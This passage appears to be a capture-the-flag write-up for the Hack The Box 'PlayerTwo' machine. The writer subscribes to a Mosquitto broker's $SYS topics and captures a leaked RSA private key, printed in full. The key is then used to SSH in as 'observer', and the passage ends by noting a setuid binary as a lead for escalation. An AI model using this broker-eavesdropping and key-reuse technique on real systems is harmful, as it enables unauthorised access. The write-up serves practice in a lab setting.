> **mosquitto\_sub** is a simple MQTT version 5/3.1.1 client that will subscribe to topics and print the messages that it receives.
>
> Subscribe to all broker status messages:
>
> * mosquitto\_sub `-v` `-t` \$SYS/\#

```text
4.7.2  Topics beginning with $

The Server MUST NOT match Topic Filters starting with a wildcard character (# or +) with Topic Names beginning with a $ character [MQTT-4.7.2-1]. The Server SHOULD prevent Clients from using such Topic Names to exchange messages with other Clients. Server implementations MAY use Topic Names that start with a leading $ character for other purposes.

Non-normative comment

·         $SYS/ has been widely adopted as a prefix to topics that contain Server-specific information or control APIs

·         Applications cannot use a topic with a leading $ character for their own purposes

Non-normative comment

·         A subscription to “#” will not receive any messages published to a topic beginning with a $

·         A subscription to “+/monitor/Clients” will not receive any messages published to “$SYS/monitor/Clients”

·         A subscription to “$SYS/#” will receive messages published to topics beginning with “$SYS/”

·         A subscription to “$SYS/monitor/+” will receive messages published to “$SYS/monitor/Clients”

·         For a Client to receive messages from topics that begin with $SYS/ and from topics that don’t begin with a $, it has to subscribe to both “#” and “$SYS/#”
```

[https://docs.oasis-open.org/mqtt/mqtt/v5.0/os/mqtt-v5.0-os.html\#\_Toc3901014](https://docs.oasis-open.org/mqtt/mqtt/v5.0/os/mqtt-v5.0-os.html#_Toc3901014) characterizes that topic subscription as: 

> $SYS/ has been widely adopted as a prefix to topics that contain Server-specific information or control APIs

"Server-specific information or control APIs" sounded very promising.

### Finding user creds

To subscribe to `$SYS/#` I combined details from the `mosquitto.conf` file with the open port netstat had shown.  `mosquitto_sub -h localhost -p 1883 -t '$SYS/#' -v`

```text
observer@player2:~$ mosquitto_sub -h localhost -p 1883 -t '$SYS/#' -v
$SYS/broker/version mosquitto version 1.4.15
$SYS/broker/timestamp Tue, 18 Jun 2019 11:42:22 -0300
...snipped...
$SYS/internal/firmware/signing Retrieving the key from aws instance
$SYS/internal/firmware/signing Key retrieved..
$SYS/broker/uptime 319 seconds
...snipped...
$SYS/internal/firmware/signing -----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA7Gc/OjpFFvefFrbuO64wF8sNMy+/7miymSZsEI+y4pQyEUBA
R0JyfLk8f0SoriYk0clR/JmY+4mK0s7+FtPcmsvYgReiqmgESc/brt3hDGBuVUr4
et8twwy77KkjypPy4yB0ecQhXgtJNEcEFUj9DrOq70b3HKlfu4WzGwMpOsAAdeFT
+kXUsGy+Cp9rp3gS3qZ2UGUMsqcxCcKhn92azjFoZFMCP8g4bBXUgGp4CmFOtdvz
SM29st5P4Wqn0bHxupZ0ht8g30TJd7FNYRcQ7/wGzjvJzVBywCxirkhPnv8sQmdE
+UAakPZsfw16u5dDbz9JElNbBTvwO9chpYIs0QIDAQABAoIBAA5uqzSB1C/3xBWd
62NnWfZJ5i9mzd/fMnAZIWXNcA1XIMte0c3H57dnk6LtbSLcn0jTcpbqRaWtmvUN
wANiwcgNg9U1vS+MFB7xeqbtUszvoizA2/ScZW3P/DURimbWq3BkTdgVOjhElh6D
62LlRtW78EaVXYa5bGfFXM7cXYsBibg1+HOLon3Lrq42j1qTJHH/oDbZzAHTo6IO
91TvZVnms2fGYTdATIestpIRkfKr7lPkIAPsU7AeI5iAi1442Xv1NvGG5WPhNTFC
gw4R0V+96fOtYrqDaLiBeJTMRYp/eqYHXg4wyF9ZEfRhFFOrbLUHtUIvkFI0Ya/Y
QACn17UCgYEA/eI6xY4GwKxV1CvghL+aYBmqpD84FPXLzyEoofxctQwcLyqc5k5f
llga+8yZZyeWB/rWmOLSmT/41Z0j6an0bLPe0l9okX4j8WOSmO6TisD4WiFjdAos
JqiQej4Jch4fTJGegctyaOwsIVvP+hKRvYIwO9CKsaAgOQySlxQBOwMCgYEA7l+3
JloRxnCYYv+eO94sNJWAxAYrcPKP6nhFc2ReZEyrPxTezbbUlpAHf+gVJNVdetMt
ioLhQPUNCb3mpaoP0mUtTmpmkcLbi3W25xXfgTiX8e6ZWUmw+6t2uknttjti97dP
QFwjZX6QPZu4ToNJczathY2+hREdxR5hR6WrJpsCgYEApmNIz0ZoiIepbHchGv8T
pp3Lpv9DuwDoBKSfo6HoBEOeiQ7ta0a8AKVXceTCOMfJ3Qr475PgH828QAtPiQj4
hvFPPCKJPqkj10TBw/a/vXUAjtlI+7ja/K8GmQblW+P/8UeSUVBLeBYoSeiJIkRf
PYsAH4NqEkV2OM1TmS3kLI8CgYBne7AD+0gKMOlG2Re1f88LCPg8oT0MrJDjxlDI
NoNv4YTaPtI21i9WKbLHyVYchnAtmS4FGqp1S6zcVM+jjb+OpBPWHgTnNIOg+Hpt
uaYs8AeupNl31LD7oMVLPDrxSLi/N5o1I4rOTfKKfGa31vD1DoCoIQ/brsGQyI6M
zxQNDwKBgQCBOLY8aLyv/Hi0l1Ve8Fur5bLQ4BwimY3TsJTFFwU4IDFQY78AczkK
/1i6dn3iKSmL75aVKgQ5pJHkPYiTWTRq2a/y8g/leCrvPDM19KB5Zr0Z1tCw5XCz
iZHQGq04r9PMTAFTmaQfMzDy1Hfo8kZ/2y5+2+lC7wIlFMyYze8n8g==
-----END RSA PRIVATE KEY-----

$SYS/internal/firmware/signing Verifying signing..
$SYS/internal/firmware/signing Sent logs to apache server.
```

I was now the proud owner of a brand-new SSH key! I grabbed it and tried logging in as the `egre55` and `observer` users I'd seen earlier.

```text
kac0@kalimaa:~/htb/playertwo$ ssh -i observer_id_rsa observer@<YOUR_IP>

load pubkey "observer_id_rsa": invalid format
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.2.5-050205-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun 25 21:41:14 UTC 2020

  System load:  0.0                Processes:            167
  Usage of /:   26.1% of 19.56GB   Users logged in:      0
  Memory usage: 25%                IP address for ens33: <YOUR_IP>
  Swap usage:   0%

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

121 packages can be updated.
5 updates are security updates.

Last login: Sun Dec  1 15:33:19 2019 from 172.16.118.129
```

Success!  The SSH private key let me log in as `observer`.  Logging in did throw an odd error, `load pubkey "observer_id_rsa": invalid format`, but it caused no actual problems.  

### User.txt

First things first...grab my hard-earned user flag!

```text
observer@player2:~$ cat user.txt 
b1aa************************bcfa
```

_Yes, I know the real flag is in uppercase ._

## Path to Power \(Gaining Administrator Access\)

### Enumeration as User `observer`

During login the MOTD noted `121 packages out of date, 5 security updates`.  At least 124 of those were almost certainly rabbit holes, so I ignored it and dug deeper into enumerating the box.

Combing through SUID-bit files, `/opt/Configuration_Utility/Protobs` jumped out at me. 

```text
observer@player2:~$ cd /opt/Configuration_Utility/
observer@player2:/opt/Configuration_Utility$ ls
ld-2.29.so  libc.so.6  Protobs
observer@player2:/opt/Configuration_Utility$ file Protobs 
Protobs: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/Con, for GNU/Linux 3.2.0, BuildID[sha1]=53892814b4e50f2f75dd5fa98b077741917688a2, stripped
```

I'd apparently found the configuration utility for the `protobs` program, and it carried the `setuid` bit. This looked like a viable path for privilege escalation. The two `.so` files seemed to hint at how the binary was built, but unfortunately my C, reverse engineering, and binary exploitation skills are weak, so this is probably beyond me for now. I'll come back to it once I've learned more.

### Root.txt

![Nope.](assets/wu/playertwo/img-6.png)
